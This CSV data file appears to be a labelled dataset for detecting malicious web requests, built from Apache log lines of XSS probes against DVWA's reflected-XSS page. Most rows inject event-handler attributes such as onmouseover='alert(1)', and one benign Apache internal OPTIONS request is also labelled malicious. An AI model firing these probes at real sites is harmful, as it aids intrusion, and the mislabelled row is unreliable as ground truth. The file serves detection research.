url,malicious
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onclick=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr oncontextmenu=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr ondblclick=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmousedown=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmouseenter=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmouseleave=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmousemove=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmouseout=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmouseover=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onmouseup=\""alert(1)\"">test</tr>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tr onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onclick=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track oncontextmenu=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track ondblclick=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"::1 - - [03/May/2021:03:41:33 -0400] ""OPTIONS * HTTP/1.0"" 200 126 ""-"" ""Apache/2.4.43 (Debian) (internal dummy connection)""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmousedown=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmouseenter=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmouseleave=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmousemove=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmouseout=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmouseover=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmouseup=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onclick=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt oncontextmenu=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt ondblclick=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmousedown=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmouseenter=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmouseleave=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmousemove=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmouseout=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmouseover=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onmouseup=\""alert(1)\"">test</tt>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onclick=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u oncontextmenu=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u ondblclick=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmousedown=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmouseenter=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmouseleave=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmousemove=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmouseout=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmouseover=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmouseup=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onclick=\""alert(1)\"">test</ul>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul oncontextmenu=\""alert(1)\"">test</ul>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul ondblclick=\""alert(1)\"">test</ul>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onmousedown=\""alert(1)\"">test</ul>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onmouseenter=\""alert(1)\"">test</ul>"" 400 0 ""-"" ""-""",1
